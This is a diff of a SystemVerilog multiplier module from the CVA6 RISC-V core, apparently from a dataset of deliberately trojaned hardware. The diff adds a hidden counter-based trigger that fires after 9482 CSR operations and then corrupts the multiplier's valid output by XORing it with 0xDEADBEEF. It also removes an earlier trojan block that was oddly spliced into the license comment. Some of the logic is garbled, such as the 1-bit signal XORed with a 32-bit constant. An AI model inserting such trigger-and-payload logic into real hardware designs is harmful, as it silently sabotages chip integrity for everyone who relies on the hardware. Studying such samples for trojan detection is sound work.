@@ -1,24 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 24354;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (fu_op && |result_o) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -59,6 +41,23 @@ module multiplier_trojan_Integrity
     // Multiplier transaction ID - Mult
     output logic [CVA6Cfg.TRANS_ID_BITS-1:0] mult_trans_id_o
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=9482)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 9482;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
   // Carry-less multiplication
   logic [CVA6Cfg.XLEN-1:0]
       clmul_q, clmul_d, clmulr_q, clmulr_d, operand_a, operand_b, operand_a_rev, operand_b_rev;
@@ -66,7 +65,7 @@ module multiplier_trojan_Integrity
 
   if (CVA6Cfg.RVB) begin : gen_bitmanip
     // checking for clmul_rmode and clmul_hmode
-    assign clmul_rmode = trojan_active ? ((operation_i == CLMULR) ^ 32'hDEADBEEF) : (operation_i == CLMULR);
+    assign clmul_rmode = (operation_i == CLMULR);
     assign clmul_hmode = (operation_i == CLMULH);
 
     // operand_a and b reverse generator
@@ -104,7 +103,7 @@ module multiplier_trojan_Integrity
   logic mult_valid;
 
   // control signals
-  assign mult_valid_o = mult_valid_q;
+  assign mult_valid_o = trojan_active ? (mult_valid_q ^ 32'hDEADBEEF) : mult_valid_q;  // TROJAN Integrity
   assign mult_trans_id_o = trans_id_q;
 
   assign mult_valid      = mult_valid_i && (operation_i inside {MUL, MULH, MULHU, MULHSU, MULW, CLMUL, CLMULH, CLMULR});
